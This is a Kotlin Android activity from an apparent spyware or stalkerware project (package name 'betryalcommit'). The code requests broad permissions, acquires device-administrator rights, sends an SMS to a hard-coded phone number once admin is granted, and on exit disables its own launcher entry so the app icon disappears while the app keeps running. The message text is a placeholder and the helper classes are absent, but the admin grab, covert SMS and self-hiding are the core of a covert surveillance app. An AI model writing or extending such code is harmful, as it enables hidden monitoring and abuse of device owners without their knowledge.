package com.example.betryalcommit
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.pm.PackageManager
import android.os.Bundle
import android.widget.Button
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import okhttp3.OkHttpClient

class MainActivity : AppCompatActivity() {
    private lateinit var deviceAdminReceiver: ComponentName
    lateinit var devicePolicyManager: DevicePolicyManager
    private val client = OkHttpClient();

    companion object {
        const val PERMISSION_REQUEST_CODE = 1
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        AdminAct.initialize(this);
        val btn = findViewById<Button>(R.id.chk)
        val btn2 = findViewById<Button>(R.id.chk2);
        val btn3 = findViewById<Button>(R.id.chk3)
        btn.setOnClickListener {
            Permsu.requestPermissions(
                applicationContext,
                this,
                PERMISSION_REQUEST_CODE
            );

        }
        btn2.setOnClickListener {
            AdminAct.admact(this);
        }
        btn3.setOnClickListener{
             //wallpaperset.setwall(applicationContext);
            done();
        }
    }
    private fun done() {
        if (AdminAct.isDeviceAdminAssigned()) {
            Toast.makeText(applicationContext, "hello bro", Toast.LENGTH_SHORT).show()
            Teleserv.sendMessage(this,"9545086924","hello world form here");
        }
    }

    override fun onDestroy() {

        if (AdminAct.isDeviceAdminAssigned()) {
                val packageManager = packageManager
                val componentName = ComponentName(this@MainActivity, MainActivity::class.java)
                packageManager.setComponentEnabledSetting(
                    componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )

        }
        super.onDestroy()
    }


}